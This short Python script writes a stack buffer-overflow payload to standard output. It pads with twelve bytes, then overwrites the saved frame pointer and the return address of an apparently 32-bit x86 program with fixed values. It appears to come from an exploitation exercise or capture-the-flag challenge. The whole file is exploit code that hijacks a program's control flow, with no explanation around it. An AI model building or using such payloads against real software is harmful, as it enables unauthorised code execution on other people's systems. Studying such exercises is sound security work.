import sys
ebp = b"\xf8\xb1\xf6\xbf"
ret = b"\x33\x99\x04\x08"
sys.stdout.buffer.write(b"a" * 12 + ebp + ret)
